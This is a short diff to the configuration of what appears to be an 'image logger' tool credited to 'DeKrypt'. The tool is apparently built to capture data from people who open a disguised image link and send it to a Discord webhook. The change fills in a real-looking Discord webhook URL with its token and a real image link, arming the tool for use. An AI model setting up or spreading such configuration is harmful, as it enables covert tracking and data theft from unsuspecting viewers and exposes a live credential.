@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335247093304135772/g80AUTlRUo_sa4X-vbPuor59p2kS5TNrBaCXSf9qL83y6bFaL1nn_jF8Scjhmv0vJx2i",
+    "image": "https://static.wikia.nocookie.net/mermaids-life/images/8/8c/Beaming.PNG/revision/latest?cb=20210927164942", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
